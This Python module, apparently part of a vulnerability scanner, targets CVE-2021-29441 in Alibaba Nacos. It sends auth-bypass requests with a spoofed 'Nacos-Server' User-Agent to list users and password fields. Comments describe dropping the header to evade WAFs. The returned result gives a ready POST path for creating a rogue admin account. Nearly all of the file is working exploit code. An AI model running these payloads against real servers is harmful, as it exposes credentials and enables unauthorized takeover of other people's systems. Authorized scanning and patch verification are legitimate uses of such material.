#!/usr/bin/env python3
# -*- coding:utf-8 -*-

cve_2021_29441_payloads = [
    {
        'path': 'nacos/v1/auth/users?pageNo=1&pageSize=10',
        'headers': {'User-Agent': 'Nacos-Server'}
    },
    {
        'path': 'v1/auth/users?pageNo=1&pageSize=10',
        'headers': {'User-Agent': 'Nacos-Server'}
    },
    {
        'path': 'auth/users?pageNo=1&pageSize=10',
        'headers': {'User-Agent': 'Nacos-Server'}
    },
    {
        'path': 'users?pageNo=1&pageSize=10',
        'headers': {'User-Agent': 'Nacos-Server'}
    },
    {
        'path': 'nacos/v1/auth/users?pageNo=1&pageSize=10',
        'headers': {}       # * 有时候数据包带User-Agent: Nacos-Server头时, 会被WAF拦截, 所以为空
    },
    {
        'path': 'v1/auth/users?pageNo=1&pageSize=10',
        'headers': {}       # * 有时候数据包带User-Agent: Nacos-Server头时, Payload会无效
    },
    {
        'path': 'auth/users?pageNo=1&pageSize=10',
        'headers': {}       # * 有时候数据包带User-Agent: Nacos-Server头时, Payload会无效
    },
    {
        'path': 'users?pageNo=1&pageSize=10',
        'headers': {}       # * 有时候数据包带User-Agent: Nacos-Server头时, Payload会无效
    }
    # {    利用漏洞创建后台用户
    #     'path': '/nacos/v1/auth/users?username=XXX&password=XXX',
    #     'data': ''
    # }
]

def cve_2021_29441_scan(clients):
    ''' 阿里巴巴Nacos未授权访问漏洞
            可以通过该漏洞添加nacos后台用户, 并登录nacos管理后台
    '''
    client = clients.get('reqClient')
    
    vul_info = {
        'app_name': 'AlibabaNacos',
        'vul_type': 'unAuthorized',
        'vul_id': 'CVE-2021-29441',
    }

    for payload in cve_2021_29441_payloads:         # * Payload
        path = payload['path']                      # * Path
        headers = payload['headers']                # * Headers

        res = client.request(
            'get',
            path,
            headers=headers,
            vul_info=vul_info
        )
        if res is None:
            continue

        if (
            ('"username":"nacos","password"' in res.text) 
            or ('"username":"nacos", "password"' in res.text) 
            or (('pageNumber' in res.text)
                and ('totalCount' in res.text)
                and ('pagesAvailable' in res.text)
                and ('pageItems' in res.text))
        ):
            results = {
                'Target': res.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Exploit': {
                    'Method': 'POST',
                    'Path': 'nacos/v1/auth/users?username=Username&password=123456a!'
                },
                'Request': res,
            }
            return results
    return None
